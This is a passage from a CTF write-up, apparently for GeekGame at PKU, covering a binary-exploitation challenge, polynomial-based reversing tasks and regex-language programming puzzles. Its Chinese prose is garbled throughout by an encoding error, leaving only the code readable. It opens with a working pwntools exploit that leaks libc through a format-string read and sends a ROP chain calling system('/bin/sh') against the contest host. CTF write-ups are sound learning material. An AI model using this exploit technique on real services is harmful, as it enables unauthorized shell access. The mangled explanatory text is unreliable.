å‘ç° libc é‡Œæœ‰ `system` å‡½æ•°ä»¥åŠå­—ç¬¦ä¸² `/bin/sh`, æ‰€ä»¥å…ˆç”¨ `printf` æ‹¿åˆ° libc çš„åœ°å€, ç„¶å ROP å³å¯, åŒæ ·éœ€è¦æ³¨æ„ $16$ å­—èŠ‚å¯¹é½. æœ‰æ—¶ä¼šè¿æ°”å·®æŠ½ä¸­ bad bytes, ä½†æˆ‘ä»¬è¦ç›¸ä¿¡å¤šæ¬¡éšæœºçš„åŠ›é‡ï¼ˆ

```py
from pwn import *
from ast import literal_eval
from subprocess import getoutput

sh = remote('prob11.geekgame.pku.edu.cn', 10011)
sh.recvuntil (b'token: ')
sh.sendline (b'70:This_is_token')

sh.recvuntil (b'characters)\n')
sh.sendline (b'%21$p')
sh.recvuntil (b'flag: ')
flag1 = int (sh.recvline ().strip ().decode (), 16)

libc_addr = 0x7fb32ee2fc50 - 0x7fb32ed3ad90 + flag1 # <mprotect>
print ('libc_addr =', hex (libc_addr))

sh.recvuntil (b'it?:\n')
sh.sendline (b'test')

pop_rdi = libc_addr + 0x2a3e5 - 0x11ec50
bin_sh = libc_addr + 0x1d8698 - 0x11ec50
syst = libc_addr + 0x50d60 - 0x11ec50

rop = b'a' * 56 + p64 (pop_rdi) + p64 (bin_sh) + p64 (0x401304) + p64 (syst)

for i in [b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d', b'\x20']:
    if rop.find (i) >= 0:
        print ('rop has bad byte', i)

sh.recvuntil (b'again? :')
print ('rop =', rop)
sh.sendline (rop)
sh.interactive ()
```

# 0x0F. ç»å¦™çš„å¤šé¡¹å¼

## Baby

ä¸¢è¿› IDA, å‘ç°å®ƒæŠŠ flag ä½œä¸ºå¤šé¡¹å¼ä»£å…¥ $1\sim 36$ çš„å€¼ä¸ç­”æ¡ˆæ•°ç»„å¯¹æ¯”, æ‰€ä»¥åš Lagrange æ’å€¼å³å¯.

PS: æˆ‘æœ¬æ¥ä»¥ä¸ºå°‘äº†ä¸€ä¸ªç‚¹å€¼, è¿™æ˜¯å› ä¸º $0$ çš„ç‚¹å€¼æ˜¯å·²çŸ¥çš„. ~~æ‰€ä»¥è®©æˆ‘å‡ºçš„è¯å°±ä¼šå°‘ç»™ä¸€ä¸ªç‚¹å€¼~~

```cpp
/* ä¸€ä»½ä»æ´›è°·æŠ„çš„æ’å€¼æ¿å­ - https://www.luogu.com.cn/blog/220037/solution-p5158 */
const int zheshisha[36] = {0xCF6, 0x16C80709, 0x86B7BDA, 0x5FBEE9E, 0x24D1FFC1, 0x16F76AE2, 0x15F03305, 0x218C23F9, 0x33163AC1, 0x332C16E, 0x27E7B4A7, 0x241D8073, 0x1C6F122, 0x2D73DE13, 0x7FC0A09, 0x0D50F7B7, 0x261B1DD, 0x37E5BB8E, 0x0DA71DC5, 0x2DC3F20C, 0x0CCB13A, 0x2F6341E4, 0x0B0611DB, 0x0A382A1A, 0x103C09B2, 0x1CE2BE88, 0x19A9FD15, 0x2621CFC1, 0x2970DEAC, 0x8A463AA, 0x116C6D31, 0x222E9178, 0x33B9C9DD, 0x2F98D035, 0x0B8177A, 0x342611E8};

signed main() {
    ios_base::sync_with_stdio(false); cin.tie(0);
    int n = 36;
    a = array(n);
    b = array(n);
    rep(i, n) a[i] = i + 1, b[i] = zheshisha[i];
    int k = 1; while(k <= (n << 1)) k <<= 1;
    poly::init(k);
    r = Inter::inter(a, b);
    rep(i, n) io.write((char)r[i]);
	io.flush ();
}
```

## Easy

ä¸¢è¿› IDA, å‘ç°å®ƒå¯¹ flag åšäº†ä¸€ä¸ªç±»ä¼¼ DFT çš„å˜æ¢, ç„¶åä¸ç­”æ¡ˆæ•°ç»„å¯¹æ¯”. æ³¨æ„åˆ°è¾“å‡ºæ˜¯è¾“å…¥çš„çº¿æ€§å˜æ¢, æ‰€ä»¥ç…§æŠ„ä¸€éä¸‹å‘ç¨‹åºçš„ä»£ç , ç®—å‡ºçº¿æ€§å˜æ¢å¯¹åº”çš„çŸ©é˜µ, ç„¶ååšé«˜æ–¯æ¶ˆå…ƒå³å¯.

```cpp
#include <bits/stdc++.h>
using namespace std;
typedef long long LL;
typedef vector<int> VI;
const int N = 1 << 18, mod = 998244353;
int ksm (int a, int b) {
	int res = 1;
	for (;b;b >>= 1, a = (LL)a * a % mod)
		if (b & 1) res = (LL)res * a % mod;
	return res;
}
int w[N];
void init () {
	int moe = ksm (3, 3808); w[N / 2] = 1;
	for (int i = N / 2 + 1; i < N; ++i)
		w[i] = (LL)w[i - 1] * moe % mod;
	for (int i = N / 2 - 1; i > 0; --i)
		w[i] = w[i * 2];
}
VI elem[64];
VI operator + (const VI &a, const VI &b) {
	int n = a.size ();
	vector<int> c(n);
	for (int i = 0; i < n; ++i)
		if ((c[i] = a[i] + b[i]) >= mod) { c[i] -= mod; }
	return c;
}
VI operator - (const VI &a, const VI &b) {
	int n = a.size ();
	vector<int> c(n);
	for (int i = 0; i < n; ++i)
		if ((c[i] = a[i] - b[i]) < 0) { c[i] += mod; }
	return c;
}
VI operator * (const VI &a, LL b) {
	int n = a.size ();
	vector<int> c(n);
	for (int i = 0; i < n; ++i)
		c[i] = a[i] * b % mod;
	return c;
}
void FFT () {
	int p = 64;
	while (p > 1) {
		p /= 2;
		for (int i = 0; i < 64; i += 2 * p) {
			for (int j = 0; j < p; ++j) {
				VI v6 = elem[i + j], v7 = elem[i + j + p];
				elem[i + j] = v6 + v7;
				elem[i + j + p] = (v6 - v7) * w[j + p];
			}
		}
	}
}
const int ans[64] = {0xF49, 0x121, 0x31C44DFF, 0x9BBB244, 0x9CD2637, 0x99E9344, 0x3A1174D9, 0x2982CE42, 0x202A3E59, 0x3AD2F444, 0x655DAC3, 0x181AE6C1, 0x2FFCF1EE, 0x0AAE9419, 0x2016E6F4, 0x19CF9F98, 0x2DEA04C3, 0x89262F4, 0x18327C16, 0x373BD1D9, 0x938E62A, 0x36B7868B, 0x3813BCFE, 0x0D213F8D, 0x7E67F22, 0x38FCD76, 0x32A17A7E, 0x2386EE67, 0x382D9FD7, 0x2FA45664, 0x4CFE37E, 0x2AF595C, 0x2103E392, 0x1536B2BA, 0x1C46D639, 0x0B170DEB, 0x2104AB3D, 0x334666E4, 0x0D52FFE1, 0x144A6446, 0x242BCC46, 0x37BF7317, 0x3A97D9A, 0x3B329D1A, 0x724F983, 0x1ED8A93E, 0x25E09BB8, 0x18121D9E, 0x2E301013, 0x105E3542, 0x375ADF03, 0x51674FE, 0x2AC2758E, 0x352291E2, 0x375D7604, 0x338E6B2A, 0x0C8EB7EB, 0x2F5350DC, 0x20E81988, 0x35F5C18E, 0x8753392, 0x0CD0ACE9, 0x17DF5455, 0x1B91C2B0};
int A[64][46]; // equations.
void Gauss () {
	for (int i = 0; i < 45; ++i) {
		if (!A[i][i]) {
			for (int j = i + 1; j < 64; ++j) if (A[j][i]) {
				swap (A[i], A[j]); break;
			}
		}
		assert (A[i][i]);
		int inv = ksm (A[i][i], mod - 2);
		for (int j = i; j < 46; ++j)
			A[i][j] = (LL)A[i][j] * inv % mod;
		for (int j = 0; j < 64; ++j) if (j != i) {
			int tmp = mod - A[j][i];
			for (int k = i; k < 46; ++k)
				A[j][k] = (A[j][k] + (LL)tmp * A[i][k]) % mod;
		}
	}
}
int main (){
	init ();
	for (int i = 0; i < 64; ++i) elem[i].resize (45);
	for (int i = 0; i < 45; ++i) elem[i][i] = 1;
	FFT ();
	for (int i = 0; i < 64; ++i) {
		A[i][45] = ans[i];
		for (int j = 0; j < 45; ++j)
			A[i][j] = elem[i][j];
	}
	Gauss ();
	for (int i = 0; i < 45; ++i) putchar (A[i][45]);
	putchar ('\n');
}
```

## Hard

åŒæ ·æ³¨æ„åˆ°è¾“å‡ºæ˜¯è¾“å…¥çš„çº¿æ€§å˜æ¢, æ‰€ä»¥ç…§æŠ„ä¸€éä¸‹å‘ç¨‹åºçš„ä»£ç , ç®—å‡ºçº¿æ€§å˜æ¢å¯¹åº”çš„çŸ©é˜µ, ç„¶ååšé«˜æ–¯æ¶ˆå…ƒå³å¯. ä» Easy ä»£ç ç¨ä½œä¿®æ”¹å³å¾—, ~~çœŸçš„å¾ˆ Hard æ.~~

```cpp
#include <bits/stdc++.h>
using namespace std;
typedef long long LL;
typedef vector<int> VI;
const int N = 1 << 18, mod = 998244353;
int ksm (int a, int b) {
	int res = 1;
	for (;b;b >>= 1, a = (LL)a * a % mod)
		if (b & 1) res = (LL)res * a % mod;
	return res;
}
int w[N], elem2[128];
VI elem[128];
void init () {
	int moe = ksm (3, 3808); w[N / 2] = 1;
	for (int i = N / 2 + 1; i < N; ++i)
		w[i] = (LL)w[i - 1] * moe % mod;
	for (int i = N / 2 - 1; i > 0; --i)
		w[i] = w[i * 2];
}
VI operator + (const VI &a, const VI &b) {
	int n = a.size ();
	vector<int> c(n);
	for (int i = 0; i < n; ++i)
		if ((c[i] = a[i] + b[i]) >= mod) { c[i] -= mod; }
	return c;
}
VI operator - (const VI &a, const VI &b) {
	int n = a.size ();
	vector<int> c(n);
	for (int i = 0; i < n; ++i)
		if ((c[i] = a[i] - b[i]) < 0) { c[i] += mod; }
	return c;
}
VI operator * (const VI &a, LL b) {
	int n = a.size ();
	vector<int> c(n);
	for (int i = 0; i < n; ++i)
		c[i] = a[i] * b % mod;
	return c;
}
void FFT (VI *elem) {
	int p = 128;
	while (p > 1) {
		p /= 2;
		for (int i = 0; i < 128; i += 2 * p) {
			for (int j = 0; j < p; ++j) {
				VI v6 = elem[i + j], v7 = elem[i + j + p];
				elem[i + j] = v6 + v7;
				elem[i + j + p] = (v6 - v7) * w[j + p];
			}
		}
	}
}
void FFT (int *elem) {
	int p = 128;
	while (p > 1) {
		p /= 2;
		for (int i = 0; i < 128; i += 2 * p) {
			for (int j = 0; j < p; ++j) {
				int v6 = elem[i + j], v7 = elem[i + j + p];
				elem[i + j] = (v6 + v7) % mod;
				elem[i + j + p] = (LL)(v6 + mod - v7) * w[j + p] % mod;
			}
		}
	}
}
void IFFT (VI *elem) {
	for (int i = 1; i < 128; i *= 2) {
		for (int j = 0; j < 128; j += i * 2) {
			for (int k = 0; k < i; ++k) {
				VI v6 = elem[j + k], v7 = elem[i + j + k] * w[i + k];
				elem[j + k] = v6 + v7;
				elem[i + j + k] = v6 - v7;
			}
		}
	}
	reverse (elem + 1, elem + 128);
	LL tmp = mod - (mod - 1) / 128;
	for (int i = 0; i < 128; ++i)
		elem[i] = elem[i] * tmp;
}
const int ans[64] = {0x2F6A, 0x5A72, 0x82BB, 0x0AB28, 0x0E0BA, 0x10431, 0x12D48, 0x13BA4, 0x1680F, 0x19B4C, 0x1A7C3, 0x1CF0C, 0x20372, 0x22B61, 0x21699, 0x25383, 0x26220, 0x2937A, 0x2ABFB, 0x2DC98, 0x2D6B3, 0x31C9D, 0x34098, 0x34EBC, 0x36C65, 0x3A27D, 0x3C317, 0x3DC21, 0x42900, 0x42A20, 0x46CA4, 0x47612, 0x49A6E, 0x4B259, 0x50845, 0x50666, 0x545CE, 0x55420, 0x5A3DE, 0x5C550, 0x5B2E2, 0x596FC, 0x59395, 0x5A07C, 0x57CF8, 0x57E0A, 0x57CBD, 0x5ADF7, 0x56512, 0x5872F, 0x58E27, 0x5AD27, 0x5936F, 0x594E2, 0x599BD, 0x5AA89, 0x5991C, 0x579AC, 0x573B4, 0x57A8B, 0x5A9EE, 0x58ACC, 0x5ABA2, 0x5B498}, zhesha[34] = {0x77, 0x65, 0x6C, 0x63, 0x6F, 0x6D, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x74, 0x68, 0x65, 0x20, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x20, 0x6F, 0x66, 0x20, 0x70, 0x6F, 0x6C, 0x79, 0x6E, 0x6F, 0x6D, 0x69, 0x61, 0x6C};
int A[64][41]; // equations.
void Gauss () {
	for (int i = 0; i < 40; ++i) {
		if (!A[i][i]) {
			for (int j = i + 1; j < 64; ++j) if (A[j][i]) {
				swap (A[i], A[j]); break;
			}
		}
		assert (A[i][i]);
		int inv = ksm (A[i][i], mod - 2);
		for (int j = i; j < 41; ++j)
			A[i][j] = (LL)A[i][j] * inv % mod;
		for (int j = 0; j < 64; ++j) if (j != i) {
			int tmp = mod - A[j][i];
			for (int k = i; k < 41; ++k)
				A[j][k] = (A[j][k] + (LL)tmp * A[i][k]) % mod;
		}
	}
}
int main (){
	init ();
	for (int i = 0; i < 128; ++i) elem[i].resize (40);
	for (int i = 0; i < 40; ++i) elem[i][i] = 1;
	for (int i = 0; i < 64; ++i) elem2[i] = zhesha[i % 34];
	FFT (elem); FFT (elem2);
	for (int i = 0; i < 128; ++i) elem[i] = elem[i] * elem2[i];
	IFFT (elem);
	for (int i = 0; i < 64; ++i) {
		A[i][40] = ans[i];
		for (int j = 0; j < 40; ++j)
			A[i][j] = elem[i][j];
	}
	Gauss ();
	for (int i = 0; i < 40; ++i) putchar (A[i][40]);
	putchar ('\n');
}
```

# 0x11. å…³é”®è¯è¿‡æ»¤å–µï¼Œè°¢è°¢å–µ

ä¸æ‡‚å°±é—®, `haruhikage.txt` çœŸæ˜¯æ˜¥æ—¥å½±æ­Œè¯å—? æ­Œè¯ç¡®å®æ˜¯ä¸é”™çš„æµ‹è¯•æ•°æ®å–µ, è‹¥æœçœŸå¦‚æ­¤å–µå–µä¼šå¾ˆé«˜å…´çš„å–µï¼ˆx

## å­—æ•°ç»Ÿè®¡å–µ

åœ¨æ–‡ä»¶å¼€å¤´æ”¾ä¸€ä¸ªè®¡æ•°å™¨, æ¯æ¬¡åƒæ‰ä¸€ä¸ªå­—ç¬¦ç„¶åç»™è®¡æ•°å™¨åŠ  1 å°±å¯ä»¥äº†å–µ!

```py
æŠŠã€^ã€‘æ›¿æ¢æˆã€0ğŸ˜¡ã€‘å–µ

ä»€ä¹ˆå–µï¼š

æŠŠã€0ğŸ˜¡(.|\s)ã€‘æ›¿æ¢æˆã€1ğŸ˜¡ã€‘å–µ
æŠŠã€1ğŸ˜¡(.|\s)ã€‘æ›¿æ¢æˆã€2ğŸ˜¡ã€‘å–µ
æŠŠã€2ğŸ˜¡(.|\s)ã€‘æ›¿æ¢æˆã€3ğŸ˜¡ã€‘å–µ
æŠŠã€3ğŸ˜¡(.|\s)ã€‘æ›¿æ¢æˆã€4ğŸ˜¡ã€‘å–µ
æŠŠã€4ğŸ˜¡(.|\s)ã€‘æ›¿æ¢æˆã€5ğŸ˜¡ã€‘å–µ
æŠŠã€5ğŸ˜¡(.|\s)ã€‘æ›¿æ¢æˆã€6ğŸ˜¡ã€‘å–µ
æŠŠã€6ğŸ˜¡(.|\s)ã€‘æ›¿æ¢æˆã€7ğŸ˜¡ã€‘å–µ
æŠŠã€7ğŸ˜¡(.|\s)ã€‘æ›¿æ¢æˆã€8ğŸ˜¡ã€‘å–µ
æŠŠã€8ğŸ˜¡(.|\s)ã€‘æ›¿æ¢æˆã€9ğŸ˜¡ã€‘å–µ
æŠŠã€9ğŸ˜¡(.|\s)ã€‘æ›¿æ¢æˆã€ğŸ˜ˆ0ğŸ˜¡ã€‘å–µ

æŠŠã€^ğŸ˜ˆã€‘æ›¿æ¢æˆã€1ã€‘å–µ
æŠŠã€0ğŸ˜ˆã€‘æ›¿æ¢æˆã€1ã€‘å–µ
æŠŠã€1ğŸ˜ˆã€‘æ›¿æ¢æˆã€2ã€‘å–µ
æŠŠã€2ğŸ˜ˆã€‘æ›¿æ¢æˆã€3ã€‘å–µ
æŠŠã€3ğŸ˜ˆã€‘æ›¿æ¢æˆã€4ã€‘å–µ
æŠŠã€4ğŸ˜ˆã€‘æ›¿æ¢æˆã€5ã€‘å–µ
æŠŠã€5ğŸ˜ˆã€‘æ›¿æ¢æˆã€6ã€‘å–µ
æŠŠã€6ğŸ˜ˆã€‘æ›¿æ¢æˆã€7ã€‘å–µ
æŠŠã€7ğŸ˜ˆã€‘æ›¿æ¢æˆã€8ã€‘å–µ
æŠŠã€8ğŸ˜ˆã€‘æ›¿æ¢æˆã€9ã€‘å–µ
æŠŠã€9ğŸ˜ˆã€‘æ›¿æ¢æˆã€ğŸ˜ˆ0ã€‘å–µ

å¦‚æœçœ‹åˆ°ã€ğŸ˜¡(.|\s)ã€‘å°±è·³è½¬åˆ°ã€ä»€ä¹ˆå–µã€‘å–µ

æŠŠã€ğŸ˜¡ã€‘æ›¿æ¢æˆã€ã€‘å–µ
è°¢è°¢å–µ
```

## æ’åºå–µ

å‘œå‘œç¬¨è›‹å–µå–µåœ¨ ~~fuck brain~~ çš„æ—¶å€™æ‰‹æ®‹æŠŠæ’åºä»£ç è¦†ç›–æ‰äº†å–µ, æœå’©ææˆ‘ç°åœ¨å°±æ¥é‡å†™ä¸€ä¸ªå–µ qwq

å¤§æ¦‚å°±æ˜¯å…ˆæŠŠç©ºè¡Œåˆ æ‰, å¼€å¤´æ”¾ä¸ª emoji è¡¨ç¤ºä¹‹å‰æ˜¯æ’å¥½åºçš„è¡Œ, ä¹‹åæ˜¯å¾…æ’åºçš„; å¹¶ä¸”æ¯è¡Œå¼€å¤´æ”¾ä¸€ä¸ª emoji è¡¨ç¤ºæŒ‡é’ˆå–µ! æ¯æ¬¡æŠŠè¿™ä¸ªæŒ‡é’ˆå‘åç§»åŠ¨ä¸€ä½, å¦‚æœç§»åŠ¨åˆ°å°½å¤´å°±æŠŠè¿™è¡Œäº¤æ¢åˆ°å¼€å¤´å–µ!

```py
æŠŠã€^ã€‘æ›¿æ¢æˆã€ğŸ˜­\nã€‘å–µ
æŠŠã€$ã€‘æ›¿æ¢æˆã€\nã€‘å–µ
æŠŠã€\n+ã€‘æ›¿æ¢æˆã€\nã€‘å–µ
æŠŠã€\nã€‘æ›¿æ¢æˆã€\nğŸ˜¡ã€‘å–µ
æŠŠã€ğŸ˜¡$ã€‘æ›¿æ¢æˆã€ã€‘å–µ

å¼€å¤´å–µï¼š
  æŠŠã€ğŸ˜¡([^\n])ã€‘æ›¿æ¢æˆã€\1ğŸ˜¡ã€‘å–µ
  å¾ªç¯å–µï¼š
    æŠŠã€\n([^\nğŸ˜­]+)\n([^\nğŸ˜¡]+)ğŸ˜¡\nã€‘æ›¿æ¢æˆã€\n\2ğŸ˜¡\n\1\nã€‘å–µ
    æŠŠã€ğŸ˜­\n([^\nğŸ˜¡]+)ğŸ˜¡\nã€‘æ›¿æ¢æˆã€\1\nğŸ˜­\nã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€ğŸ˜¡\nã€‘å°±è·³è½¬åˆ°ã€å¾ªç¯å–µã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€ğŸ˜¡ã€‘å°±è·³è½¬åˆ°ã€å¼€å¤´å–µã€‘å–µ

æŠŠã€\n*ğŸ˜­(.|\s)+$ã€‘æ›¿æ¢æˆã€ã€‘å–µ
è°¢è°¢å–µ
```

## Brainfuck å–µ

ä»£ç å¾ˆé•¿ä½†å…¶å®æ›´ä¸ºç®€å•å–µ! åœ¨å­—ç¬¦ä¸²é‡Œå¼€è¾Ÿä¸¤æ®µå†…å­˜åˆ†åˆ«è®°å½• Memory Cell å’Œå¾ªç¯åµŒå¥—çš„å±‚æ•°, å†æ¥ä¸€ä¸ª emoji ä½œä¸ºç¨‹åºè®¡æ•°å™¨, æœ€ååˆ†åˆ«å®ç°æ¯ä¸ªå‘½ä»¤å°±å¥½äº†å–µ!

å‡ºé¢˜äººæ˜¯æ‡‚çš„å–µ! å†™å®Œè¿™ä¸ªæ¨¡æ‹Ÿæˆ‘è¯´è¯å°±å…¨æ˜¯å–µäº†å–µ :)

```py
æŠŠã€[^><+\-.,[\]]ã€‘æ›¿æ¢æˆã€ã€‘å–µ
æŠŠã€^ã€‘æ›¿æ¢æˆã€ 0ğŸ‘¼ ğŸ˜¡ğŸ˜ˆğŸ¤”ã€‘å–µ
æŠŠã€$ã€‘æ›¿æ¢æˆã€ğŸ˜­ã€‘å–µ

å¼€å¤´å–µï¼š
  å¦‚æœçœ‹åˆ°ã€ğŸ¤”\+ã€‘å°±è·³è½¬åˆ°ã€åŠ å·å–µã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€ğŸ¤”-ã€‘å°±è·³è½¬åˆ°ã€å‡å·å–µã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€ğŸ¤”\[ã€‘å°±è·³è½¬åˆ°ã€å·¦æ‹¬å·å–µã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€ğŸ¤”\]ã€‘å°±è·³è½¬åˆ°ã€å³æ‹¬å·å–µã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€ğŸ¤”<ã€‘å°±è·³è½¬åˆ°ã€å·¦ç§»å–µã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€ğŸ¤”>ã€‘å°±è·³è½¬åˆ°ã€å³ç§»å–µã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€ğŸ¤”\.ã€‘å°±è·³è½¬åˆ°ã€è¾“å‡ºå–µã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€ç»“æŸå–µã€‘å–µ

åŠ å·å–µï¼š
  æŠŠã€ğŸ‘¼ã€‘æ›¿æ¢æˆã€ğŸ‘¼å–µã€‘å–µ
  æŠŠã€0ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€1ğŸ‘¼ã€‘å–µ
  æŠŠã€1ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€2ğŸ‘¼ã€‘å–µ
  æŠŠã€2ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€3ğŸ‘¼ã€‘å–µ
  æŠŠã€3ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€4ğŸ‘¼ã€‘å–µ
  æŠŠã€4ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€5ğŸ‘¼ã€‘å–µ
  æŠŠã€5ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€6ğŸ‘¼ã€‘å–µ
  æŠŠã€6ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€7ğŸ‘¼ã€‘å–µ
  æŠŠã€7ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€8ğŸ‘¼ã€‘å–µ
  æŠŠã€8ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€9ğŸ‘¼ã€‘å–µ
  æŠŠã€9ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€ğŸ˜«0ğŸ‘¼ã€‘å–µ

  è¿›ä½å–µï¼š
    æŠŠã€ ğŸ˜«ã€‘æ›¿æ¢æˆã€ 1ã€‘å–µ
    æŠŠã€0ğŸ˜«ã€‘æ›¿æ¢æˆã€1ã€‘å–µ
    æŠŠã€1ğŸ˜«ã€‘æ›¿æ¢æˆã€2ã€‘å–µ
    æŠŠã€2ğŸ˜«ã€‘æ›¿æ¢æˆã€3ã€‘å–µ
    æŠŠã€3ğŸ˜«ã€‘æ›¿æ¢æˆã€4ã€‘å–µ
    æŠŠã€4ğŸ˜«ã€‘æ›¿æ¢æˆã€5ã€‘å–µ
    æŠŠã€5ğŸ˜«ã€‘æ›¿æ¢æˆã€6ã€‘å–µ
    æŠŠã€6ğŸ˜«ã€‘æ›¿æ¢æˆã€7ã€‘å–µ
    æŠŠã€7ğŸ˜«ã€‘æ›¿æ¢æˆã€8ã€‘å–µ
    æŠŠã€8ğŸ˜«ã€‘æ›¿æ¢æˆã€9ã€‘å–µ
    æŠŠã€9ğŸ˜«ã€‘æ›¿æ¢æˆã€ğŸ˜«0ã€‘å–µ

    å¦‚æœçœ‹åˆ°ã€ğŸ˜«0ã€‘å°±è·³è½¬åˆ°ã€è¿›ä½å–µã€‘å–µ

  æŠŠã€ğŸ¤”\+ã€‘æ›¿æ¢æˆã€+ğŸ¤”ã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€å¼€å¤´å–µã€‘å–µ

å‡å·å–µï¼š
  æŠŠã€ğŸ‘¼ã€‘æ›¿æ¢æˆã€ğŸ‘¼å–µã€‘å–µ
  æŠŠã€0ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€ğŸ˜«9ğŸ‘¼ã€‘å–µ
  æŠŠã€1ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€0ğŸ‘¼ã€‘å–µ
  æŠŠã€2ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€1ğŸ‘¼ã€‘å–µ
  æŠŠã€3ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€2ğŸ‘¼ã€‘å–µ
  æŠŠã€4ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€3ğŸ‘¼ã€‘å–µ
  æŠŠã€5ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€4ğŸ‘¼ã€‘å–µ
  æŠŠã€6ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€5ğŸ‘¼ã€‘å–µ
  æŠŠã€7ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€6ğŸ‘¼ã€‘å–µ
  æŠŠã€8ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€7ğŸ‘¼ã€‘å–µ
  æŠŠã€9ğŸ‘¼å–µã€‘æ›¿æ¢æˆã€8ğŸ‘¼ã€‘å–µ

  é€€ä½å–µï¼š
    æŠŠã€0ğŸ˜«ã€‘æ›¿æ¢æˆã€ğŸ˜«9ã€‘å–µ
    æŠŠã€1ğŸ˜«ã€‘æ›¿æ¢æˆã€0ã€‘å–µ
    æŠŠã€2ğŸ˜«ã€‘æ›¿æ¢æˆã€1ã€‘å–µ
    æŠŠã€3ğŸ˜«ã€‘æ›¿æ¢æˆã€2ã€‘å–µ
    æŠŠã€4ğŸ˜«ã€‘æ›¿æ¢æˆã€3ã€‘å–µ
    æŠŠã€5ğŸ˜«ã€‘æ›¿æ¢æˆã€4ã€‘å–µ
    æŠŠã€6ğŸ˜«ã€‘æ›¿æ¢æˆã€5ã€‘å–µ
    æŠŠã€7ğŸ˜«ã€‘æ›¿æ¢æˆã€6ã€‘å–µ
    æŠŠã€8ğŸ˜«ã€‘æ›¿æ¢æˆã€7ã€‘å–µ
    æŠŠã€9ğŸ˜«ã€‘æ›¿æ¢æˆã€8ã€‘å–µ

    å¦‚æœçœ‹åˆ°ã€ğŸ˜«9ã€‘å°±è·³è½¬åˆ°ã€é€€ä½å–µã€‘å–µ

  æŠŠã€ 0([0-9]+ğŸ‘¼)ã€‘æ›¿æ¢æˆã€ \1ã€‘å–µ
  æŠŠã€ğŸ¤”-ã€‘æ›¿æ¢æˆã€-ğŸ¤”ã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€å¼€å¤´å–µã€‘å–µ

å³ç§»å–µï¼š
  æŠŠã€ğŸ¤”>ã€‘æ›¿æ¢æˆã€>ğŸ¤”ã€‘å–µ
  æŠŠã€ğŸ‘¼ ã€‘æ›¿æ¢æˆã€ ğŸ‘¼ã€‘å–µ
  æŠŠã€ğŸ‘¼ğŸ˜¡ã€‘æ›¿æ¢æˆã€0ğŸ‘¼ ğŸ˜¡ã€‘å–µ
  æŠŠã€ğŸ‘¼([0-9]+)ã€‘æ›¿æ¢æˆã€\1ğŸ‘¼ã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€å¼€å¤´å–µã€‘å–µ

å·¦ç§»å–µï¼š
  æŠŠã€ğŸ¤”<ã€‘æ›¿æ¢æˆã€<ğŸ¤”ã€‘å–µ
  æŠŠã€( [0-9]+)ğŸ‘¼ã€‘æ›¿æ¢æˆã€ğŸ‘¼\1ã€‘å–µ
  æŠŠã€^ğŸ‘¼ã€‘æ›¿æ¢æˆã€ 0ğŸ‘¼ã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€å¼€å¤´å–µã€‘å–µ

å·¦æ‹¬å·å–µï¼š
  å¦‚æœçœ‹åˆ°ã€ 0ğŸ‘¼ã€‘å°±è·³è½¬åˆ°ã€é€€å‡ºå¾ªç¯å–µã€‘å–µ
  æŠŠã€ğŸ¤”\[ã€‘æ›¿æ¢æˆã€[ğŸ¤”ã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€å¼€å¤´å–µã€‘å–µ
  é€€å‡ºå¾ªç¯å–µï¼š
    å¦‚æœçœ‹åˆ°ã€ğŸ¤”\[ã€‘å°±è·³è½¬åˆ°ã€Mygoã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€ğŸ¤”\]ã€‘å°±è·³è½¬åˆ°ã€Crychicã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€ğŸ¤”.ã€‘å°±è·³è½¬åˆ°ã€Soyoã€‘å–µ
    Mygoï¼š
      æŠŠã€ğŸ˜ˆã€‘æ›¿æ¢æˆã€[ğŸ˜ˆã€‘å–µ
      å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€Soyoã€‘å–µ
    Crychicï¼š
      æŠŠã€\[ğŸ˜ˆã€‘æ›¿æ¢æˆã€ğŸ˜ˆã€‘å–µ
    Soyoï¼š
      æŠŠã€ğŸ¤”(.)ã€‘æ›¿æ¢æˆã€\1ğŸ¤”ã€‘å–µ
      å¦‚æœçœ‹åˆ°ã€ğŸ˜¡ğŸ˜ˆã€‘å°±è·³è½¬åˆ°ã€å¼€å¤´å–µã€‘å–µ
      å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€é€€å‡ºå¾ªç¯å–µã€‘å–µ

å³æ‹¬å·å–µï¼š
  æŠŠã€ğŸ¤”\]ã€‘æ›¿æ¢æˆã€]ğŸ¤”ã€‘å–µ
